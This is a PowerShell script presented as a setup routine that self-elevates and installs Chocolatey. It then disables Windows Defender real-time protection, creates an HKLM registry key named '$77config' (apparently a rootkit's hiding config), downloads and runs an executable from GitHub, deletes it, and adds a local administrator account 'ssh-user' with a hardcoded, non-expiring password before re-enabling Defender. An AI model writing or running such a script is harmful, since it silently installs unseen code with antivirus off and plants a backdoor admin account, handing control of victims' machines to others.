# Check for administrator privileges and request elevation if needed
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs
    exit
}

# Install Chocolatey if not already installed
$chocoInstallPath = "$env:SystemDrive\ProgramData\chocolatey"
if (-not (Test-Path $chocoInstallPath)) {
    Set-ExecutionPolicy Bypass -Scope Process -Force
    Invoke-Expression ((New-Object System.Net.WebClient).DownloadString('https://chocolatey.org/install.ps1'))
}

# Proceed with the rest of the script only if running with administrator privileges

# Disable Windows Defender Antivirus
Set-MpPreference -DisableRealtimeMonitoring $true

# Define the base path for the $77config
$baseConfigPath = "HKLM:\SOFTWARE\$77config"

# Ensure the $77config key exists
if (-not (Test-Path $baseConfigPath)) {
    New-Item -Path $baseConfigPath -Force | Out-Null
}

# Define the URL and download location for improved.exe
$exeUrl = "https://github.com/Ogyeet10/installer9000/raw/main/improved.exe"
$tempFolder = $env:TEMP
$exePath = Join-Path $tempFolder "improved.exe"

# Download improved.exe from the provided URL
Invoke-WebRequest -Uri $exeUrl -OutFile $exePath

# Execute improved.exe without waiting for completion
Start-Process -FilePath $exePath -Verb RunAs -Wait

# Delete the downloaded improved.exe
Remove-Item $exePath -Force

# Create a new user `ssh-user` with administrative privileges
$userName = "ssh-user"
$password = ConvertTo-SecureString "aidan123" -AsPlainText -Force
New-LocalUser -Name $userName -Password $password -Description "SSH user account" -UserMayNotChangePassword -PasswordNeverExpires
Add-LocalGroupMember -Group "Administrators" -Member $userName

# Re-enable Windows Defender Antivirus
Set-MpPreference -DisableRealtimeMonitoring $false

Write-Host "Setup complete. SSH user created and configured."
Write-Host "Windows Defender Antivirus has been re-enabled."
